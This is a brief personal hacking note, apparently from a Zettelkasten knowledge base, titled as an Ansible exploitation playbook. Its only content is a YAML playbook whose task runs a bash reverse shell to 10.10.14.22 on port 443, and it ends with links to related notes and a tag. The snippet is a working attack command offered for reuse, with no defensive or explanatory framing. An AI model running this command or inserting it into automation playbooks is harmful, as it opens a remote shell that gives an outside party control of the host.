# ansible exploiting playbook rev shell
```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```

# References
- [20221003150338](/zet/20221003150338/) ansible exploiting playbook
- ~/kb/hacking/misc/ansible.md

Tags:
    #assorted

